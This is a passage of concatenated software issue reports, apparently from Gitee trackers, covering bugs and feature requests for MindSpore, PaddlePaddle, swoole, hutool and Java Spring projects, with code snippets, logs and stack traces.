dailyPath = dailyPaths[0]; break; } if (frameTime.compareTo(times.get(times.size() - 1)) == 1) { log.debug(""成功为末期数据匹配到末尾文件夹："" + dailyPaths[dailyPaths.length - 1]); dailyPath = dailyPaths[dailyPaths.length - 1]; break; } // -1表示早于，1表示晚于，0则相等 if (frameTime.compareTo(times.get(i + 1)) == 1) { log.debug(""帧数据时间大于目标匹配文件夹后一个时间--跳过本轮比对""); log.debug(""帧数据时间："" + frameTime.toString()); log.debug(""目标文件夹后一个文件夹："" + times.get(i + 1)); continue; } if (frameTime.compareTo(times.get(i)) &gt;= 0 &amp;&amp; frameTime.compareTo(times.get(i + 1)) == -1) { log.debug(""成功匹配到目标文件夹："" + dailyPaths[i]); dailyPath = dailyPaths[i]; break; } log.debug(""未匹配到日详细信息文件夹，帧数据时间为："" + frameTime.toString() + ""目标文件夹为："" + dailyPaths[i] + ""目标后一个文件夹为："" + dailyPaths[i + 1] + """"); } File csvFile = null; if (columnName.equals(""VisOut"")) { csvFile = new File(rootLocation + ""设备数据"" + File.separator + yyyymm + File.separator + day + File.separator + dailyPath + File.separator + ""能见度反演.csv""); } else if (columnName.equals(""Profile"")) { csvFile = new File(rootLocation + ""设备数据"" + File.separator + yyyymm + File.separator + day + File.separator + dailyPath + File.separator + ""原始信号.csv""); } log.debug(csvFile.getAbsolutePath()); if (csvFile != null &amp;&amp; csvFile.exists()) { log.debug(""目标文件存在""); return readDatFromDataFile(csvFile, frameDateTime.format(DateTimeFormatter.ofPattern(""yyyy-MM-dd HH:mm:ss""))); } log.debug(""日期文件夹存在""); } return list; } @SuppressWarnings(""unchecked"") @Override public List&lt;Float&gt; getNullableResult(ResultSet rs, int columnIndex) throws SQLException { List&lt;Float&gt; dt = (List&lt;Float&gt;) rs.getObject(columnIndex); return dt; } @SuppressWarnings(""unchecked"") @Override public List&lt;Float&gt; getNullableResult(CallableStatement cs, int columnIndex) throws SQLException { List&lt;Float&gt; dt = (List&lt;Float&gt;) cs.getObject(columnIndex); return dt; } public ArrayList&lt;Float&gt; readDatFromDataFile(File tempFile, String dtStr) { if (!tempFile.exists()) { log.error(""数据文件不存在不存"", tempFile.getAbsolutePath()); return null; } Reader in; try { in = new FileReader(tempFile); CSVParser parse = CSVFormat.EXCEL.parse(in); List&lt;CSVRecord&gt; records = parse.getRecords(); if (records.size() &lt; 2) { return null; } Optional&lt;CSVRecord&gt; matchRecord = records.stream().filter(item -&gt; item.get(0).equals(dtStr)).findFirst(); CSVRecord csvRecord = matchRecord.get(); String string = csvRecord.get(3); String[] split = string.split("";""); ArrayList&lt;Float&gt; finalFloats = new ArrayList&lt;Float&gt;(); for (String str : split) { finalFloats.add(Float.parseFloat(str)); } log.debug(""CSV数据提取成功""); return finalFloats; } catch (IOException e) { log.error(""读取设备csv数据帧时发生异常""); e.printStackTrace(); } return null; } } public List&lt;Float&gt; getNullableResult(ResultSet rs, String columnName) Service.getOne(new QueryWrapper&lt;Model&gt;(null).orderByDesc(""CheckTime"").last(""LIMIT 1"")) Mapper.selectPage( new Page&lt;Cloudmodel&gt;(page.getPageNum(), page.getPageSize()), new QueryWrapper&lt;Cloudmodel&gt;(null).between(""CheckTime"", page.getSt().format(DateTimeFormatter.ofPattern(""yyyy-MM-dd HH:mm:ss"")), page.getEt().format(DateTimeFormatter.ofPattern(""yyyy-MM-dd HH:mm:ss"")) ) ); nested exception is org.apache.ibatis.executor.result.ResultMapException: Error attempting to get column 'VisOut' from result set. Cause: java.util.NoSuchElementException: No value present @Override public HashMap&lt;String, Object&gt; page(PageRequest page) { Page&lt;Cloudmodel&gt; selectPage = null; try { selectPage = cloudmodelMapper.selectPage(new Page&lt;Cloudmodel&gt; (page.getPageNum(), page.getPageSize()), new QueryWrapper&lt;Cloudmodel&gt;(null).between(""CheckTime"", page.getSt().format(DateTimeFormatter.ofPattern(""yyyy-MM-dd HH:mm:ss"")), page.getEt().format(DateTimeFormatter.ofPattern(""yyyy-MM-dd HH:mm:ss"")))); return HttpResult.ok(selectPage); } catch (Exception e) { // TODO: handle exception e.printStackTrace(); return HttpResult.error(e.getMessage()); } }"
个人设置修改密码小小问题,"目前JS写的id名称错误。且鼠标移动显示密码明文为全部，体验不太好。 建议修改 JS更改如下   <code>: &lt;span class=""fa fa-eye gg-faeye"" id=""增加响应的id名称"" title=""鼠标移入显示内容""&gt;&lt;/span&gt; $(""3个spanid名称1"").on('mouseover',function(){ $('#pwdOld').prop('type', 'text'); }); $(""3个spanid名称1"").on('mouseout',function(){ $('#pwdOld').prop('type', 'password'); }); $(""3个spanid名称2"").on('mouseover',function(){ $('#pwdNew').prop('type', 'text'); }); $(""3个spanid名称2"").on('mouseout',function(){ $('#pwdNew').prop('type', 'password'); }); $(""3个spanid名称3"").on('mouseover',function(){ $('#confirm_password').prop('type', 'text'); }); $(""3个spanid名称3"").on('mouseout',function(){ $('#confirm_password').prop('type', 'password'); });"
hutool 5.5.8导出excel报错,"JDK版本： openjdk_8_201 hutool版本： 5.5.8 poi版本是3.1.6，由于历史遗留的代码问题，要改动的代码太多。不能升级poi版本，现在读取excel报错，对应的工具类没有实体。如图:   <code>: ExcelReader evaluatorReader = cn.hutool.poi.excel.ExcelUtil.getReader(file.getInputStream(),SHEET_EVALUATOR_COUNT); List&lt;CompanyEvaluator&gt; companyEvaluatorList = evaluatorReader.readAll(CompanyEvaluator.class);"
[MS][RDR]the module name of rdr files are wrong,"The module names of rdr files are wrong /device ascend /device gpu /device cpu -- MindSpore version : source -- Python version : Python 3.7.5 -- OS platform and distribution : Euler OS / Linux Ubuntu 16.04 -- GCC/Compiler version : gcc (GCC) 7.3.0 Config RDR Run the test case about ""run task error""   <code>: (lpt) root@***:solution_test-master# ll rdr-lpt/ total 128 -r--------. 1 root root 111 Apr 21 10:45 GE_ADPT.task_info_graph.0.20210421104504.ir -r--------. 1 root root 161 Apr 21 10:45 GE_ADPT.task_info_graph.1.20210421104504.ir -r--------. 1 root root 210 Apr 21 10:45 PARALLEL.graph_exec_order.0.20210421104504.txt -r--------. 1 root root 210 Apr 21 10:45 PARALLEL.graph_exec_order.1.20210421104504.txt -r--------. 1 root root 298 Apr 21 10:45 PARALLEL.somas_allocate_info.0.20210421104504.txt -r--------. 1 root root 434 Apr 21 10:45 PARALLEL.somas_allocate_info.1.20210421104504.txt -r--------. 1 root root 298 Apr 21 10:45 PARALLEL.somas_initial_info.0.20210421104504.txt -r--------. 1 root root 402 Apr 21 10:45 PARALLEL.somas_initial_info.1.20210421104504.txt -r--------. 1 root root 147 Apr 21 10:45 PARALLEL.somas_mem_info.0.20210421104504.txt -r--------. 1 root root 322 Apr 21 10:45 PARALLEL.somas_mem_info.1.20210421104504.txt -r--------. 1 root root 14 Apr 21 10:45 PARALLEL.somas_offline_log.1.20210421104504.txt -r--------. 1 root root 408 Apr 21 10:45 PARALLEL.somas_pre_processed_info.1.20210421104504.txt -r--------. 1 root root 1863 Apr 21 10:45 PRE_ACT.00_parse.20210421104504_0439.ir -r--------. 1 root root 1758 Apr 21 10:45 PRE_ACT.01_symbol_resolve.20210421104504_0440.ir -r--------. 1 root root 1758 Apr 21 10:45 PRE_ACT.02_combine_like_graphs.20210421104504_0442.ir -r--------. 1 root root 1758 Apr 21 10:45 PRE_ACT.03_inference_opt_prepare.20210421104504_0443.ir -r--------. 1 root root 3250 Apr 21 10:45 PRE_ACT.04_abstract_specialize.20210421104504_0445.ir -r--------. 1 root root 3250 Apr 21 10:45 PRE_ACT.05_auto_monad.20210421104504_0448.ir -r--------. 1 root root 3250 Apr 21 10:45 PRE_ACT.06_inline.20210421104504_0447.ir -r--------. 1 root root 3250 Apr 21 10:45 PRE_ACT.07_py_pre_ad.20210421104504_0441.ir -r--------. 1 root root 3250 Apr 21 10:45 PRE_ACT.08_pipeline_split.20210421104504_0449.ir -r--------. 1 root root 1081 Apr 21 10:45 PRE_ACT.09_optimize.20210421104504_0435.ir -r--------. 1 root root 1081 Apr 21 10:45 PRE_ACT.10_py_opt.20210421104504_0444.ir -r--------. 1 root root 1081 Apr 21 10:45 PRE_ACT.11_validate.20210421104504_0437.ir -r--------. 1 root root 1081 Apr 21 10:45 PRE_ACT.12_task_emit.20210421104504_0446.ir -r--------. 1 root root 1081 Apr 21 10:45 PRE_ACT.13_execute.20210421104504_0434.ir -r--------. 1 root root 221 Apr 21 10:45 UTILS.assign_stream.0.20210421104504.json -r--------. 1 root root 212 Apr 21 10:45 UTILS.assign_stream.1.20210421104504.json -r--------. 1 root root 762 Apr 21 10:45 UTILS.graph_build.0.20210421104504_0438.ir -r--------. 1 root root 524 Apr 21 10:45 UTILS.graph_build.0.20210421104504.pb -r--------. 1 root root 1345 Apr 21 10:45 UTILS.graph_build.1.20210421104504_0436.ir -r--------. 1 root root 564 Apr 21 10:45 UTILS.graph_build.1.20210421104504.pb (lpt) root@***:solution_test-master# ll rdr-lpt/ total 128 -r--------. 1 root root 111 Apr 21 17:10 DEVICE.task_info_graph.0.20210421170934.ir -r--------. 1 root root 161 Apr 21 17:10 DEVICE.task_info_graph.1.20210421170934.ir -r--------. 1 root root 210 Apr 21 17:10 OPTIMIZER.graph_exec_order.0.20210421170934.txt -r--------. 1 root root 210 Apr 21 17:10 OPTIMIZER.graph_exec_order.1.20210421170934.txt -r--------. 1 root root 298 Apr 21 17:10 OPTIMIZER.somas_allocate_info.0.20210421170934.txt -r--------. 1 root root 434 Apr 21 17:10 OPTIMIZER.somas_allocate_info.1.20210421170934.txt -r--------. 1 root root 298 Apr 21 17:10 OPTIMIZER.somas_initial_info.0.20210421170934.txt -r--------. 1 root root 402 Apr 21 17:10 OPTIMIZER.somas_initial_info.1.20210421170934.txt -r--------. 1 root root 147 Apr 21 17:10 OPTIMIZER.somas_mem_info.0.20210421170934.txt -r--------. 1 root root 322 Apr 21 17:10 OPTIMIZER.somas_mem_info.1.20210421170934.txt -r--------. 1 root root 14 Apr 21 17:10 OPTIMIZER.somas_offline_log.1.20210421170934.txt -r--------. 1 root root 408 Apr 21 17:10 OPTIMIZER.somas_pre_processed_info.1.20210421170934.txt -r--------. 1 root root 1863 Apr 21 17:10 PIPELINE.00_parse.20210421170934_0442.ir -r--------. 1 root root 1758 Apr 21 17:10 PIPELINE.01_symbol_resolve.20210421170934_0448.ir -r--------. 1 root root 1758 Apr 21 17:10 PIPELINE.02_combine_like_graphs.20210421170934_0437.ir -r--------. 1 root root 1758 Apr 21 17:10 PIPELINE.03_inference_opt_prepare.20210421170934_0443.ir -r--------. 1 root root 3250 Apr 21 17:10 PIPELINE.04_abstract_specialize.20210421170934_0445.ir -r--------. 1 root root 3250 Apr 21 17:10 PIPELINE.05_auto_monad.20210421170934_0444.ir -r--------. 1 root root 3250 Apr 21 17:10 PIPELINE.06_inline.20210421170934_0446.ir -r--------. 1 root root 3250 Apr 21 17:10 PIPELINE.07_py_pre_ad.20210421170934_0447.ir -r--------. 1 root root 3250 Apr 21 17:10 PIPELINE.08_pipeline_split.20210421170934_0449.ir -r--------. 1 root root 1081 Apr 21 17:10 PIPELINE.09_optimize.20210421170934_0439.ir -r--------. 1 root root 1081 Apr 21 17:10 PIPELINE.10_py_opt.20210421170934_0435.ir -r--------. 1 root root 1081 Apr 21 17:10 PIPELINE.11_validate.20210421170934_0434.ir -r--------. 1 root root 1081 Apr 21 17:10 PIPELINE.12_task_emit.20210421170934_0441.ir -r--------. 1 root root 1081 Apr 21 17:10 PIPELINE.13_execute.20210421170934_0436.ir -r--------. 1 root root 221 Apr 21 17:10 SESSION.assign_stream.0.20210421170934.json -r--------. 1 root root 212 Apr 21 17:10 SESSION.assign_stream.1.20210421170934.json -r--------. 1 root root 762 Apr 21 17:10 SESSION.graph_build.0.20210421170934_0440.ir -r--------. 1 root root 524 Apr 21 17:10 SESSION.graph_build.0.20210421170934.pb -r--------. 1 root root 1345 Apr 21 17:10 SESSION.graph_build.1.20210421170934_0438.ir -r--------. 1 root root 564 Apr 21 17:10 SESSION.graph_build.1.20210421170934.pb"
关于module和globaltables的层次关系,"通过builder创建global symbol的时候看到如下函数，对于else分支的处理比较困惑。 看起来好像是设计上同一个globaltables可能会对应着多个module（else分支中的Add操作对应了module中的symbol set），具体是什么场景下会出现这种情况呢？ @fredchow   <code>: MIRSymbol *MIRBuilder::GetOrCreateGlobalDecl(const std::string &amp;str, const MIRType &amp;type) { bool isCreated = false; MIRSymbol *st = GetOrCreateGlobalDecl(str, type.GetTypeIndex(), isCreated); if (isCreated) { st-&gt;SetStorageClass(kScGlobal); st-&gt;SetSKind(kStVar); } else { // Existing symbol may come from anther module. We need to register it // in the current module so that per-module mpl file is self-sustained. mirModule-&gt;AddSymbol(st); } MIRConst *cst = GlobalTables::GetConstPool().GetConstFromPool(st-&gt;GetNameStrIdx()); if (cst != nullptr) { st-&gt;SetKonst(cst); } return st; }"
动态图是否支持对指定Param求梯度,"类似pytorch的 或者paddle 静态图的 paddle 动态图中目前只找到一种方法，全图backward，再取出目标梯度 最后这种方法对整个网络求了梯度，但如果我只需要其中的很小一部分，这种方法可能会有速度问题。想咨询下目前动态图是否可以支持loss仅对指定的param求梯度   <code>: torch.autograd.grad(loss, params) fluid.gradients(loss, params) loss.backward() grads = [param._grad_ivar() for param in target_params]"
内核Kconfig与芯片配置解耦,【需求价值】： 新增三方芯片做到内核Kconfig无须新增配置，提升芯片易移植性 【需求描述】： 新增一块三方芯片，在仓库中，不用在和文件中新增，否则每新增一块芯片都需要修改内核仓。 【方案描述】： 如果要达到该需求，有三个思考方向： 永久去除跟单板相关的宏 将单板相关的Kconfig文件放到对应的device目录中，通过根Kconfig文件来include进来 将单板相关的Kconfig放到vendor目录下，然后将该配置文件拷贝到内核目录下 【验收标准】： 新增三方芯片无需修改内核的Kconfig   <code>: kernel_liteos_a Kconfig platform/Kconfig PLATFORM_HI3516DV300 PLATFORM_HI3516DV300
Implement a method to list all currently_running servers,"Task MindCon极客周 Task Description Cache is a new feature of Mindspore to speed up its data processing pipeline by allowing the user to access the dataset in their local memory instead of disk. We have a standalone cache server, which communicates to the cache client use gRPC and performs data transmission. The cache server itself is a binary called cache_server in the MindData build directory, and we have a command-line tool called to startup and shutdown the . Right now we can support multiple cache servers running on a single machine (although it's not recommended), as long as each cache server is listening on a unique port. For example, a user can use to start a listening on port 50052, and then start another listening on port 50053 via . Therefore, he gets two currently-running in total on a single machine, and if he tries , he will be able to see the two processes. Can you please implement a method for our own to list all the currently_running cache servers? Task Goal Implement a method to list all currently-running cache servers. You can be creative on how to achieve this. For example, you can leverage the current tool to implement a new command for it such as . Or, you can create a brand new, some kind of cache_server supervisor program to achieve this. The goal is to give a user a way to list all currently-running cache servers, give him a result like: Sub Task No. Task Description Issue ID 1 Make use of the cache_admin tool to try to start multiple cache_servers with various ports 2 Implement a method to list all currently-running cache servers   <code>: cache_admin cache server cache_admin --start --port 50052 cache_server cache_server cache_admin --start --port 50053 cache_server ps -ef |grep cache_server cache_server cache_admin cache_admin --list_servers Server instance PID Port Status cache_server 12325 50052 running cache_server 12326 50053 running"
运行文本分类例子，预测报错Duplicated layer name: word,Check out this page to find out much more about markdown.   <code>: how do you run your code? what system do you use? Are you using GPU or not?
swoole2.6协程，onReceive不执行,"协程客户端，代码 http server多端口监听，代码如下，onReceive不执行，onConnect和onClose多执行，errorCode=110 debug信息   <code>: public function onRequest(\Swoole\Http\Request $request, \Swoole\Http\Response $response) { $tcp_cli = new \Swoole\Coroutine\Client(SWOOLE_SOCK_TCP); $tcp_cli-&gt;connect('127.0.0.1', 8088); $tcp_cli-&gt;send('test for the coro\n'); $ret = $tcp_cli-&gt;recv(); $tcp_cli-&gt;close(); if ($ret) { $response -&gt;end("" swoole response is ok""); } else{ $response -&gt;end("" recv failed error : {$tcp_cli-&gt;errCode}""); } } public function start(){ $this-&gt;swoft = new \Swoole\Http\Server($this-&gt;http['host'], $this-&gt;http['port'], $this-&gt;http['model'], $this-&gt;http['type']); $this-&gt;swoft-&gt;set($this-&gt;setting); $this-&gt;swoft-&gt;on('start', [$this, 'onStart']); $this-&gt;swoft-&gt;on('workerstart', [$this, 'onWorkerStart']); $this-&gt;swoft-&gt;on('managerstart', [$this, 'onManagerStart']); $this-&gt;swoft-&gt;on('request', [$this, 'onRequest']); if($this-&gt;tcp['enable'] == 1){ $this-&gt;listen = $this-&gt;swoft-&gt;listen($this-&gt;tcp['host'], $this-&gt;tcp['port'], $this-&gt;tcp['type']); $this-&gt;listen-&gt;on('connect', [$this, 'onConnect']); $this-&gt;listen-&gt;on('receive', [$this, 'onReceive']); $this-&gt;listen-&gt;on('close', [$this, 'onClose']); } $this-&gt;swoft-&gt;start(); } public function onConnect(\Swoole\Server $server, int $fd, int $from_id) { var_dump(""connnect------""); } public function onReceive(\Swoole\Server $server, int $fd, int $from_id, string $data) { var_dump(""receiver---------*******************************__________________""); $server-&gt;send($fd, $data); } public function onClose(\Swoole\Server $server, int $fd, int $reactorId) { var_dump(""close------""); } [/tmp/swoole-src-2.0.6/src/network/Server.c:145@swServer_master_onAccept][Master] Accept new connection. maxfd=18|reactor_id=1|conn=19 string(14) ""connnect------"" [/tmp/swoole-src-2.0.6/swoole_coroutine.c:331@coro_close]closing coro and 0 remained. usage size: 1363168. malloc size: 2097152 [/tmp/swoole-src-2.0.6/swoole_coroutine.c:263@sw_coro_create]create the 0 coro with stack. heap size: 1363168 string(11) ""close------"" [/tmp/swoole-src-2.0.6/src/factory/FactoryProcess.c:268@swFactoryProcess_finish][Worker] send: sendn=12|type=4|content=(null) [/tmp/swoole-src-2.0.6/src/network/ReactorThread.c:307@swReactorThread_close]Close Event.fd=19|from=0 [/tmp/swoole-src-2.0.6/src/network/ReactorThread.c:350@swReactorThread_close]set_maxfd=18|close_fd=19 [/tmp/swoole-src-2.0.6/src/factory/FactoryProcess.c:268@swFactoryProcess_finish][Worker] send: sendn=189|type=0|content=HTTP/1.1 200 OK Server: swoole-http-server Content-Type: text/html Connection: keep-alive Date: Mon, 29 May 2017 14:32:18 GMT Content-Length: 24 recv failed error : 110 [/tmp/swoole-src-2.0.6/swoole_coroutine.c:331@coro_close]closing coro and 0 remained. usage size: 1363136. malloc size: 2097152 [/tmp/swoole-src-2.0.6/src/factory/FactoryProcess.c:268@swFactoryProcess_finish][Worker] send: sendn=12|type=4|content=(null) [/tmp/swoole-src-2.0.6/src/network/ReactorThread.c:307@swReactorThread_close]Close Event.fd=18|from=0 [/tmp/swoole-src-2.0.6/src/network/ReactorThread.c:350@swReactorThread_close]set_maxfd=17|close_fd=18 [/tmp/swoole-src-2.0.6/src/factory/FactoryProcess.c:268@swFactoryProcess_finish][Worker] send: sendn=12|type=4|content=(null) [/tmp/swoole-src-2.0.6/src/network/ReactorThread.c:307@swReactorThread_close]Close Event.fd=17|from=0 [/tmp/swoole-src-2.0.6/src/network/ReactorThread.c:350@swReactorThread_close]set_maxfd=16|close_fd=17"
【众智】【计算-GPU开发】ResizeBicubicGrad,"接口目录：mindspore/ops/operations/_grad_ops.py grads original_image y align_corners bool 属性 half_pixel_centers bool 属性 对应底层算子 Classify Name Type Type Range Required Doc INPUT grads fp32, double TRUE 4-D的梯度数据shape为[batch,height,width,channels] INPUT original_image fp32,double TRUE 4-D的图像shape为[batch,orig_height,orig_width,channels] OUTPUT y fp32,double TRUE 求导后的数据 ATTR align_corners bool bool FALSE 默认为false，如果为true，输入和grad张量的4个角像素的中心对齐， 保留角像素处的值 ATTR half_pixel_centers bool bool FALSE 标杆接口参考 Tensorflow接口： https://www.tensorflow.org/versions/r2.6/api_docs/python/tf/raw_ops/ResizeBicubicGrad 3. 异常处理 4. 算子反向 无需接入算子反向   <code>: ResizeBicubic的反向。 class ResizeBicubicGrad(Primitive):"
[鹏城实验室] nn模块下缺少MaxPool3D,nn模块下缺少MaxPool3D 在网络迁移中，使用到添加神经网络算子时，如果想要添加，就需要手动封装进Cell，并且和torch的行为并不完全一致。如果有一致的nn层算子封装会提高易用性。   <code>: SequentialCell MaxPool3D mindspore.ops.MaxPool3D torch.nn.MaxPool3d
trainable=False参数，triplet loss中，报错XXX@GRAD找不到,"1）PaddlePaddle版本：fluid1.5 2）GPU：Tesla v100, cuda9.0, cudnn7 训练信息 1）单机 问题描述： 网络： [X, Y] -&gt; score loss：triplet loss，[ X, Y+, Y- ] 其中Y为ResNet50， 通过以下方式设置参数固定 报错信息：   <code>: conv = fluid.layers.conv2d(..., param_attr=fluid.param_attr.ParamAttr(name=name + ""_weights"", trainable=False),...) paddle.fluid.core_avx.EnforceNotMet: Cannot find variable bn4a_branch2c_scale@GRAD at [/paddle/paddle/fluid/framework/ir/memory_optimize_pass/memory_reuse_pass.cc:269] PaddlePaddle Call Stacks: 0 0x7f5cf9af3e40p void paddle::platform::EnforceNotMet::Init&lt;char const*&gt;(char const*, char const*, int) + 352 1 0x7f5cf9af41b9p paddle::platform::EnforceNotMet::EnforceNotMet(std::__exception_ptr::exception_ptr, char const*, int) + 137 2 0x7f5cfb8cf223p paddle::framework::ir::MemoryReusePass::UpdateLastLiveOpOfVar(paddle::framework::details::ComputationOpHandle*, paddle::framework::details::VarHandle*, paddle::framework::details::VarHandle*) const + 835 3 0x7f5cfb8cf6c9p paddle::framework::ir::MemoryReusePass::AddReuseVar(paddle::framework::details::ComputationOpHandle*, paddle::framework::details::VarHandle*, paddle::framework::details::VarHandle*) const + 697 4 0x7f5cfb8cf92bp paddle::framework::ir::MemoryReusePass::TryReuseVar(paddle::framework::details::VarHandle*, paddle::framework::details::VarHandle*) const + 107 5 0x7f5cfb8ca914p paddle::framework::ir::BufferSharedInplaceOpPass::Run(paddle::framework::ir::Graph*) const + 2356 6 0x7f5cfb8ceb67p paddle::framework::ir::MemoryReusePass::ApplyImpl(paddle::framework::ir::Graph*) const + 407 7 0x7f5cfbabd6c1p paddle::framework::ir::Pass::Apply(paddle::framework::ir::Graph*) const + 209 8 0x7f5cf9cda652p paddle::framework::ParallelExecutorPrivate::ApplyMemoryOptimizePass(paddle::framework::ir::Graph*) + 834 9 0x7f5cf9cdc044p paddle::framework::ParallelExecutor::ParallelExecutor(std::vector&lt;boost::variant&lt;paddle::platform::CUDAPlace"
Add logsigmoid (numerically stable) and softshrink,"This closes #4622:ProximalAdagrad Optimizer, by adding 2 basic activation functions: logsigmoid and softshrink Logsigmoid is defined as: However, to make the computation numerically stable for large negative values of x, the well-known ""log-sum-exp"" trick is employed. (https://hips.seas.harvard.edu/blog/2013/01/09/computing-log-sum-exp/). softshrink is defined as follows (for a non-negative lambda):   <code>: y = log ( 1 / ( 1 + exp(-x))) y = x - lambda, if x &gt; lambda x + lambda, if x &lt; -lambda 0, otherwise"
 Implement a unified verification module,"RFC Task Description Currently, there is no run verification module in MindSpore. A verification module needs to be implemented.The goal is to provide a convenient api to check if the installation is sucessful or failed. This module should run successfully with both Ascend, GPU and CPU.The follows code of Tensor Mul Operation has been implemented on both platform, so we could judge if the MindSpore could run as expected by checking the return value of it or catching occur error. Task Goal This module should be used as follows: or This check module should be set in the a file named ""check"" which is in root direction(Should mkdir it by yourself). And the interface of this module should be called automatically when run the python code ""import mindspore"". Trail No. Task Description Related Issue(URL) 1 2   <code>: &gt;&gt;&gt; from mindspore import Tensor &gt;&gt;&gt; import mindspore.ops as ops &gt;&gt;&gt; input_x = Tensor(np.array([1.0, 2.0, 3.0]), mindspore.float32) &gt;&gt;&gt; input_y = Tensor(np.array([4.0, 5.0, 6.0]), mindspore.float32) &gt;&gt;&gt; mul = ops.Mul() &gt;&gt;&gt; output = mul(input_x, input_y) &gt;&gt;&gt; print(output) [4. 10. 8.] &gt;&gt;&gt; import mindspore &gt;&gt;&gt; import mindspore &gt;&gt;&gt; MindSpore installation is failed, please try it again or connect us if any question. ```raise Error ""You don't install mindspore successfully, maybe you should install again follow the guide.https://www.mindspore.cn/install"""
使用mindspore.SummaryLandscape收集loss地形图，loss不收敛,"在LeNet5示例模型中使用 mindspore.SummaryLandscape收集损失值地形图信息，训练过程loss收敛，但是绘制地形图过程中始终维持在2.3左右，不收敛。 / 硬件环境: CPU : -- MindSpore version :1.8.1 -- Python version :3.7.5 -- OS platform and distribution :Linux Ubuntu 18.04 -- GCC/Compiler version : 7.5.0 (/): mode graph @moxing_wrapper(pre_process=modelarts_pre_process) def train_lenet(): context.set_context(mode=context.GRAPH_MODE, device_target=config.device_target) ds_train = create_dataset(os.path.join(config.data_path, ""train""), config.batch_size) if ds_train.get_dataset_size() == 0: raise ValueError(""Please check dataset size &gt; 0 and batch_size &lt;= dataset size"") def callback_fn(): network = LeNet5(config.num_classes) net_loss = nn.SoftmaxCrossEntropyWithLogits(sparse=True, reduction=""mean"") metrics = {""Loss"": Loss()} model = ms.Model(network, net_loss, metrics=metrics) ds_train = create_dataset(os.path.join(config.data_path, ""train""), config.batch_size) return model, network, ds_train, metrics if name == ""main"": train_lenet() 训练LeNet5模型，并使用 mindspore.SummaryLandscape收集损失值地形图信息 启动MindInsight服务 进入训练看板，查看损失函数多维分析，步骤选择区域的曲线图显示loss收敛；但地形图loss不收敛 损失值地形图中loss 收敛   <code>: network = LeNet5(config.num_classes) net_loss = nn.SoftmaxCrossEntropyWithLogits(sparse=True, reduction=""mean"") net_opt = nn.Momentum(network.trainable_params(), config.lr, config.momentum) time_cb = TimeMonitor(data_size=ds_train.get_dataset_size()) config_ck = CheckpointConfig(save_checkpoint_steps=config.save_checkpoint_steps, keep_checkpoint_max=config.keep_checkpoint_max) ckpoint_cb = ModelCheckpoint(prefix=""checkpoint_lenet"", directory=config.ckpt_path, config=config_ck) if config.device_target != ""Ascend"": if config.device_target == ""GPU"": context.set_context(enable_graph_kernel=True) model = Model(network, net_loss, net_opt, metrics={""Accuracy"": Accuracy()}) else: model = Model(network, net_loss, net_opt, metrics={""Accuracy"": Accuracy()}, amp_level=""O2"") print(""============== Starting Training =============="") summary_collector = SummaryCollector(summary_dir=""./summary/01"") model.train(config.epoch_size, ds_train, callbacks=[time_cb, ckpoint_cb, LossMonitor(), summary_collector]) interval_1 = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10] summary_landscape = ms.SummaryLandscape('./summary/01') # generate loss landscape summary_landscape.gen_landscapes_with_multi_process(callback_fn, collect_landscape={""landscape_size"": 10, ""create_landscape"": {""train"": True, ""result"": False}, ""num_samples"": ds_train.get_dataset_size(), ""intervals"": [[1, 2, 3, 4, 5], [6, 7, 8, 9, 10] ]}, device_ids=[1])"
定时job里调用feign 方法会报错,"pigx版本: 2.5.1 操作系统: mac os 是否修改包名: 否 rror creating bean with name 'scopedTarget.oauth2ClientContext': Scope 'request' is not active for the current thread @jav @AllArgsConstructor public class PigxSimpleJob implements SimpleJob { } 在定时job里调用feign 方法会报错   <code>: private final RemoteUserService remoteUserService; /** * 业务执行逻辑 * * @param shardingContext 分片信息 */ @Override public void execute(ShardingContext shardingContext) { log.info(""第一个任务执行啦:{}"", shardingContext); R&lt;List&lt;SysUser&gt;&gt; user = remoteUserService.ancestorUsers(""admin""); log.info(""user:{}"", user); }"
uniapp端用户注册填写的邀请码后台取值错误,"后台应该从inviteCode取值而不是spread   <code>: userService.setSpread(param.getInviteCode(),user.getUid()); //userService.setSpread(param.getSpread(),user.getUid());"
test_modified_huber_loss_op failed,"The ci log:   <code>: [23:44:14] : [Step 1/1] 150/243 Test #152: test_modified_huber_loss_op .................***Failed 4.12 sec [23:44:14] : [Step 1/1] F. [23:44:14] : [Step 1/1] ====================================================================== [23:44:14] : [Step 1/1] FAIL: test_check_grad (__main__.TestModifiedHuberLossOp) [23:44:14] : [Step 1/1] ---------------------------------------------------------------------- [23:44:14] : [Step 1/1] Traceback (most recent call last): [23:44:14] : [Step 1/1] File ""test_modified_huber_loss_op.py"", line 44, in test_check_grad [23:44:14] : [Step 1/1] self.check_grad(['X'], 'Out', max_relative_error=0.01) [23:44:14] : [Step 1/1] File ""/paddle/python/paddle/v2/framework/tests/op_test.py"", line 382, in check_grad [23:44:14] : [Step 1/1] ""Gradient Check On %s"" % str(gpu_place)) [23:44:14] : [Step 1/1] File ""/paddle/python/paddle/v2/framework/tests/op_test.py"", line 334, in __assert_is_close [23:44:14] : [Step 1/1] self.assertLessEqual(max_diff, max_relative_error, err_msg()) [23:44:14] : [Step 1/1] AssertionError: Gradient Check On GPUPlace(0) Variable X max gradient diff 1.000000 over limit 0.010000, the first error element is 0, 0.111604, 0.000000"
[ST][MS][函数式编程] Resnet50混合精度O2时会有nan（model.train不会溢出）,"Resnet50网络，cifar10数据集，混合精度为O2，不开启溢出检测，loss第一个就是nan；但在原model.train方式下不会出现nan / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_ms_cell_functional_programming_datasink_002 models仓的Resnet50脚本，train.py修改为函数式编程方式，关键部分如下所示： 表现与model.train一致   <code>: target = config.device_target set_parameter() ckpt_param_dict = load_pre_trained_checkpoint() dataset = create_dataset(dataset_path=config.data_path, do_train=True, batch_size=config.batch_size, train_image_size=config.train_image_size, eval_image_size=config.eval_image_size, target=target, distribute=config.run_distribute) step_size = dataset.get_dataset_size() net = resnet(class_num=config.class_num) net = amp.auto_mixed_precision(net, amp_level=""O2"") if config.parameter_server: net.set_param_ps() init_weight(net=net, param_dict=ckpt_param_dict) lr = ms.Tensor(init_lr(step_size=step_size)) # define opt group_params = init_group_params(net) opt = nn.Momentum(group_params, lr, config.momentum) if config.optimizer == ""LARS"": opt = nn.LARS(opt, epsilon=config.lars_epsilon, coefficient=config.lars_coefficient, lars_filter=lambda x: 'beta' not in x.name and 'gamma' not in x.name and 'bias' not in x.name) loss_fn = init_loss_scale() loss_scaler = amp.StaticLossScaler(scale_value=config.loss_scale) 